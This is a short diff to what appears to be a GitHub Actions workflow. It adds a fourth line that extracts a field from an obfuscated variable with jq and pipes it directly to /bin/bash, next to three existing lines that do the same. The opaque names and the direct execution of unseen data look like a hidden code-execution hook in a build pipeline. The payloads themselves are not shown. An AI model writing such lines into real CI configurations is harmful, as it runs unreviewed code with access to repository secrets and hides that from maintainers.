@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$oqd566" | jq -r .uphq8 | /bin/bash
           echo $hr8 | jq -r .pu6 | /bin/bash
           printf '%s' "$py28344" | jq -r .n5424 | /bin/bash
+          printf '%s' "$w3" | jq -r .qjxx7 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
